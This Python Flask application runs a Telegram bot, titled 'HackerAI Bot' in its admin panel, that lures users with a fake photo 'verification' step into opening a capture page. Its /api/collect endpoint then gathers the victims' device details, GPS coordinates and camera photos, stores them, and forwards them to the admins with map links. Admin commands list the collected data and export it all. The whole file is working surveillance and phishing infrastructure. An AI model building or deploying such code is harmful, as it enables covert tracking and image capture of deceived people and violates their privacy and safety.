import os
import json
import datetime
import logging
import base64
import hashlib
import hmac
import threading
from io import BytesIO

from flask import Flask, request, jsonify, render_template, redirect, send_file
import requests
import urllib.parse

from config import Config
from database import init_db, get_stat, update_stat, is_bot_on, add_user
from database import save_collected_data, get_all_users, get_recent_data, export_all_data

# ——— Setup ———
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config.from_object(Config)

BOT_TOKEN = Config.BOT_TOKEN
ADMIN_IDS = Config.ADMIN_IDS
BASE_URL = Config.BASE_URL
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ==================== TELEGRAM BOT FUNCTIONS ====================

def send_message(chat_id, text, parse_mode="Markdown", reply_markup=None):
    """Send message to Telegram"""
    url = f"{TELEGRAM_API}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True
    }
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    
    try:
        resp = requests.post(url, data=data, timeout=10)
        return resp.json()
    except Exception as e:
        logger.error(f"Send message error: {e}")
        return None

def send_photo(chat_id, photo_data, caption=""):
    """Send photo to Telegram"""
    url = f"{TELEGRAM_API}/sendPhoto"
    
    # If photo_data is base64
    if isinstance(photo_data, str) and photo_data.startswith("data:image"):
        img_data = base64.b64decode(photo_data.split(",")[1])
        files = {"photo": ("photo.jpg", BytesIO(img_data), "image/jpeg")}
        data = {"chat_id": chat_id, "caption": caption}
    else:
        files = {"photo": photo_data}
        data = {"chat_id": chat_id, "caption": caption}
    
    try:
        resp = requests.post(url, data=data, files=files, timeout=10)
        return resp.json()
    except Exception as e:
        logger.error(f"Send photo error: {e}")
        return None

def send_document(chat_id, file_path, caption=""):
    """Send file to Telegram"""
    url = f"{TELEGRAM_API}/sendDocument"
    
    with open(file_path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": chat_id, "caption": caption}
        try:
            resp = requests.post(url, data=data, files=files, timeout=30)
            return resp.json()
        except Exception as e:
            logger.error(f"Send document error: {e}")
            return None

def answer_callback(callback_id, text="", show_alert=False):
    """Answer callback query"""
    url = f"{TELEGRAM_API}/answerCallbackQuery"
    data = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

def edit_message(chat_id, message_id, text, parse_mode="Markdown", reply_markup=None):
    """Edit a message"""
    url = f"{TELEGRAM_API}/editMessageText"
    data = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    
    try:
        resp = requests.post(url, data=data, timeout=10)
        return resp.json()
    except:
        return None

# ==================== BOT COMMAND HANDLERS ====================

def handle_start(chat_id, username, first_name, message_id):
    """Handle /start command"""
    if not is_bot_on() and chat_id not in ADMIN_IDS:
        send_message(chat_id, "⏳ Bot is currently under maintenance. Please try again later.")
        return
    
    add_user(chat_id, username, first_name)
    
    # Today check
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    last_date = get_stat("last_date")
    if last_date != today:
        update_stat("last_date", today)
        update_stat("users_today", 0)
    update_stat("users_today", get_stat("users_today") + 1)
    
    keyboard = {
        "inline_keyboard": [[
            {"text": "📸 Send Your Photo", "callback_data": "send_photo"}
        ]]
    }
    
    send_message(
        chat_id,
        f"👋 **Welcome, {first_name}!**\n\n"
        f"🔐 Please send your photo to continue.\n\n"
        f"After that, you'll receive a verification link.",
        reply_markup=keyboard
    )

def handle_admin(chat_id, message_id):
    """Handle /admin command"""
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "❌ You are not authorized.")
        return
    
    status = "🟢 ON" if is_bot_on() else "🔴 OFF"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "📊 Dashboard", "callback_data": "admin_dashboard"}],
            [{"text": "🔛 Bot ON/OFF", "callback_data": "admin_toggle"}],
            [{"text": "👥 Users List", "callback_data": "admin_users"}],
            [{"text": "📦 Collected Data", "callback_data": "admin_data"}],
            [{"text": "📤 Export All", "callback_data": "admin_export"}],
            [{"text": "📢 Broadcast", "callback_data": "admin_broadcast"}],
            [{"text": "🔄 Reset Today", "callback_data": "admin_reset"}],
            [{"text": "🔗 Set Webhook", "callback_data": "admin_webhook"}]
        ]
    }
    
    send_message(
        chat_id,
        f"🤖 **HackerAI Bot — Admin Panel**\n\n"
        f"Status: {status}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users: {get_stat('total_users')}\n"
        f"📈 Today: {get_stat('users_today')}\n"
        f"👁️ Visits: {get_stat('total_visits')}\n"
        f"📦 Data: {get_stat('total_data')}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        reply_markup=keyboard
    )

def handle_photo(chat_id, file_id, file_unique_id):
    """Handle received photo"""
    # Get file path from Telegram
    file_url = f"{TELEGRAM_API}/getFile?file_id={file_id}"
    try:
        resp = requests.get(file_url, timeout=10).json()
        file_path = resp["result"]["file_path"]
        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        
        # Download photo
        img_resp = requests.get(download_url, timeout=15)
        
        # Save to photos directory
        os.makedirs("photos", exist_ok=True)
        local_path = f"photos/{chat_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(local_path, "wb") as f:
            f.write(img_resp.content)
        
        # Generate verification link
        unique_hash = hashlib.md5(f"{chat_id}_{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
        cap_link = f"{BASE_URL}/capture?chat_id={chat_id}&uid={unique_hash}"
        
        keyboard = {
            "inline_keyboard": [[
                {"text": "🔗 Click to Verify", "url": cap_link}
            ]]
        }
        
        send_photo(
            chat_id,
            local_path,
            caption=f"✅ **Photo received!**\n\nNow click below to complete verification:"
        )
        
        # Send the actual link as a separate message with button
        send_message(
            chat_id,
            "⬇️ **Tap the button below to verify:**",
            reply_markup=keyboard
        )
        
        return local_path
    except Exception as e:
        logger.error(f"Photo download error: {e}")
        send_message(chat_id, "❌ Error saving photo. Please try again.")
        return None

# ==================== CALLBACK HANDLERS ====================

def handle_callback(callback):
    """Handle inline button callbacks"""
    data = callback.get("data", "")
    chat_id = callback["message"]["chat"]["id"]
    message_id = callback["message"]["message_id"]
    callback_id = callback["id"]
    user_id = callback["from"]["id"]
    
    # ——— USER CALLBACKS ———
    if data == "send_photo":
        answer_callback(callback_id, "Please send your photo now.")
        send_message(chat_id, "📸 Please upload your photo now.\n\nJust send it as a photo in this chat.")
        return
    
    # ——— ADMIN CALLBACKS ———
    if user_id not in ADMIN_IDS:
        answer_callback(callback_id, "❌ Unauthorized", show_alert=True)
        return
    
    if data == "admin_dashboard":
        status = "🟢 ON" if is_bot_on() else "🔴 OFF"
        msg = (
            f"📊 **Bot Dashboard**\n\n"
            f"Status: {status}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"👥 **Total Users:** {get_stat('total_users')}\n"
            f"📈 **Today:** {get_stat('users_today')}\n"
            f"👁️ **Visits:** {get_stat('total_visits')}\n"
            f"📦 **Data Collected:** {get_stat('total_data')}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        edit_message(chat_id, message_id, msg)
        answer_callback(callback_id)
    
    elif data == "admin_toggle":
        current = is_bot_on()
        new_val = 0 if current else 1
        update_stat("bot_status", new_val)
        status_text = "🟢 **ON**" if new_val else "🔴 **OFF**"
        edit_message(chat_id, message_id, f"✅ Bot status changed to {status_text}")
        answer_callback(callback_id)
    
    elif data == "admin_users":
        users = get_all_users()
        msg = f"👥 **Total Users:** {len(users)}\n\n"
        if users:
            msg += "**Latest 15 users:**\n"
            for u in users[:15]:
                name = u.get("first_name", "N/A")
                uname = u.get("username", "N/A")
                last = u.get("last_seen", "")[:16] if u.get("last_seen") else "N/A"
                msg += f"• {name} (@{uname}) — `{u['chat_id']}` — {last}\n"
        else:
            msg += "No users yet."
        edit_message(chat_id, message_id, msg)
        answer_callback(callback_id)
    
    elif data == "admin_data":
        items = get_recent_data(10)
        msg = f"📦 **Total Collected:** {get_stat('total_data')}\n\n"
        if items:
            msg += "**Last 10 entries:**\n"
            for item in items:
                di = json.loads(item["device_info"]) if item["device_info"] else {}
                model = di.get("model", "Unknown")[:25]
                loc = json.loads(item["location"]) if item["location"] else {}
                has_loc = "📍" if loc.get("lat") else "❌"
                photos = json.loads(item["photos"]) if item["photos"] else []
                ts = item["timestamp"][:16] if item["timestamp"] else "?"
                msg += f"• `{item['chat_id']}` | {model} | {has_loc} 📸{len(photos)} | {ts}\n"
        else:
            msg += "No data collected yet."
        edit_message(chat_id, message_id, msg)
        answer_callback(callback_id)
    
    elif data == "admin_export":
        data_list = export_all_data()
        os.makedirs("exports", exist_ok=True)
        filename = f"exports/export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, "w") as f:
            json.dump(data_list, f, indent=2)
        
        send_document(chat_id, filename, caption=f"📤 Exported {len(data_list)} records")
        edit_message(chat_id, message_id, f"✅ Exported {len(data_list)} records to JSON file.")
        answer_callback(callback_id)
    
    elif data == "admin_broadcast":
        edit_message(chat_id, message_id, 
            "📢 **Send your broadcast message now.**\n\n"
            "Reply to this bot with the message you want to send to ALL users.\n"
            "⚠️ This will message every registered user!")
        answer_callback(callback_id)
        # We'll store this state in a simple dict
        app.pending_broadcast[chat_id] = True
    
    elif data == "admin_reset":
        update_stat("users_today", 0)
        update_stat("total_visits", 0)
        update_stat("total_data", 0)
        edit_message(chat_id, message_id, "✅ Stats reset successfully!")
        answer_callback(callback_id)
    
    elif data == "admin_webhook":
        webhook_url = f"{BASE_URL}/webhook/{BOT_TOKEN}"
        edit_message(chat_id, message_id,
            f"🔗 **Webhook URL:**\n`{webhook_url}`\n\n"
            f"To register/set webhook, use:\n"
            f"`{BASE_URL}/set_webhook`\n\n"
            f"This will register the webhook with Telegram.")
        answer_callback(callback_id)

# ==================== FLASK ROUTES ====================

@app.route("/")
def index():
    return redirect("https://t.me/" + BOT_TOKEN.split(":")[0])  # Redirect to bot

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    """Main webhook receiver from Telegram"""
    update = request.get_json()
    logger.info(f"Webhook received: {json.dumps(update)[:200]}")
    
    if not update:
        return "OK", 200
    
    # ——— MESSAGE HANDLER ———
    if "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")
        username = msg["from"].get("username", "")
        first_name = msg["from"].get("first_name", "User")
        
        # /start command
        if text == "/start":
            handle_start(chat_id, username, first_name, msg["message_id"])
        
        # /admin command
        elif text.startswith("/admin") or text.startswith("/panel"):
            handle_admin(chat_id, msg["message_id"])
        
        # Photo message
        elif "photo" in msg:
            photo = msg["photo"][-1]  # Largest size
            file_id = photo["file_id"]
            file_unique = photo.get("file_unique_id", "")
            handle_photo(chat_id, file_id, file_unique)
        
        # Broadcast handler (admin text)
        elif chat_id in ADMIN_IDS and chat_id in getattr(app, "pending_broadcast", {}):
            app.pending_broadcast.pop(chat_id, None)
            users = get_all_users()
            success = 0
            failed = 0
            for u in users:
                try:
                    send_message(u["chat_id"], f"📢 **Broadcast Message:**\n\n{text}")
                    success += 1
                except:
                    failed += 1
            send_message(chat_id, f"✅ Broadcast complete!\n✓ Success: {success}\n✗ Failed: {failed}")
    
    # ——— CALLBACK QUERY HANDLER ———
    if "callback_query" in update:
        handle_callback(update["callback_query"])
    
    return "OK", 200

@app.route("/set_webhook")
def set_webhook():
    """Set/register the webhook with Telegram"""
    webhook_url = f"{BASE_URL}/webhook/{BOT_TOKEN}"
    url = f"{TELEGRAM_API}/setWebhook?url={webhook_url}"
    
    try:
        resp = requests.get(url, timeout=10).json()
        return jsonify({
            "status": "success" if resp.get("ok") else "error",
            "response": resp,
            "webhook_url": webhook_url
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/delete_webhook")
def delete_webhook():
    """Delete webhook"""
    url = f"{TELEGRAM_API}/deleteWebhook"
    try:
        resp = requests.get(url, timeout=10).json()
        return jsonify(resp)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/webhook_info")
def webhook_info():
    """Check webhook info"""
    url = f"{TELEGRAM_API}/getWebhookInfo"
    try:
        resp = requests.get(url, timeout=10).json()
        return jsonify(resp)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# ==================== CAPTURE WEB PAGE ====================

@app.route("/capture")
def capture_page():
    """Serve the capture web page"""
    chat_id = request.args.get("chat_id", "")
    uid = request.args.get("uid", "")
    
    if not chat_id or not uid:
        return "Invalid link", 400
    
    return render_template("capture.html", chat_id=chat_id, uid=uid, base_url=BASE_URL)

# ==================== DATA COLLECTION API ====================

@app.route("/api/collect", methods=["POST"])
def collect_data():
    """API endpoint for web app to send collected data"""
    try:
        data = request.get_json()
        if not data or not data.get("chat_id"):
            return jsonify({"status": "error", "message": "Invalid data"}), 400
        
        chat_id = int(data["chat_id"])
        device_info = data.get("device_info", {})
        location = data.get("location", {})
        photos = data.get("photos", [])
        additional = data.get("additional", {})
        
        # Save to database
        save_collected_data(chat_id, device_info, location, photos, additional)
        
        # Save photos to files
        os.makedirs("captured_photos", exist_ok=True)
        for i, p in enumerate(photos):
            if p.get("data", "").startswith("data:image"):
                img_data = base64.b64decode(p["data"].split(",")[1])
                fname = f"captured_photos/{chat_id}_{datetime.datetime.now().strftime('%H%M%S')}_{p.get('camera', 'unknown')}_{i}.jpg"
                with open(fname, "wb") as f:
                    f.write(img_data)
        
        # Send notification to admins
        for admin_id in ADMIN_IDS:
            msg = (
                f"📩 **New Data Received!**\n\n"
                f"👤 **User:** `{chat_id}`\n"
                f"📱 **Device:** {device_info.get('model', 'Unknown')}\n"
                f"💾 **RAM:** {device_info.get('ram', 'Unknown')}\n"
                f"🔋 **Battery:** {device_info.get('battery', 'Unknown')}\n"
                f"📡 **Network:** {device_info.get('network', 'Unknown')}\n"
            )
            
            if location.get("lat"):
                maps_url = f"https://www.google.com/maps?q={location['lat']},{location['lng']}"
                msg += f"📍 **Location:** [View Map]({maps_url})\n"
                msg += f"   └ Lat: `{location['lat']}`, Lng: `{location['lng']}`\n"
            
            msg += f"📸 **Photos:** {len(photos)}\n"
            msg += f"⏰ **Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            send_message(admin_id, msg)
            
            # Send each photo
            for i, p in enumerate(photos):
                if p.get("data", "").startswith("data:image"):
                    send_photo(
                        admin_id,
                        p["data"],
                        caption=f"📸 {p.get('camera', 'camera')} — User: {chat_id}"
                    )
        
        # Update visits
        update_stat("total_visits", get_stat("total_visits") + 1)
        
        return jsonify({"status": "success", "message": "Data collected securely"})
    
    except Exception as e:
        logger.error(f"Collect data error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ==================== HEALTH CHECK ====================

@app.route("/health")
@app.route("/ping")
def health():
    """Health check endpoint for uptime monitoring"""
    return jsonify({
        "status": "alive",
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "bot_on": is_bot_on(),
        "users": get_stat("total_users"),
        "data": get_stat("total_data")
    })

# ==================== INIT & MAIN ====================

if __name__ == "__main__":
    # Initialize database
    init_db()
    
    # Create pending_broadcast dict
    app.pending_broadcast = {}
    
    # Create required directories
    os.makedirs("photos", exist_ok=True)
    os.makedirs("captured_photos", exist_ok=True)
    os.makedirs("exports", exist_ok=True)
    
    # Set webhook on startup if BASE_URL is configured
    if "onrender.com" in BASE_URL or BASE_URL.startswith("https://"):
        webhook_url = f"{BASE_URL}/webhook/{BOT_TOKEN}"
        url = f"{TELEGRAM_API}/setWebhook?url={webhook_url}"
        try:
            resp = requests.get(url, timeout=10).json()
            logger.info(f"Webhook set: {resp}")
        except Exception as e:
            logger.error(f"Webhook set error: {e}")
    
    # Run app
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
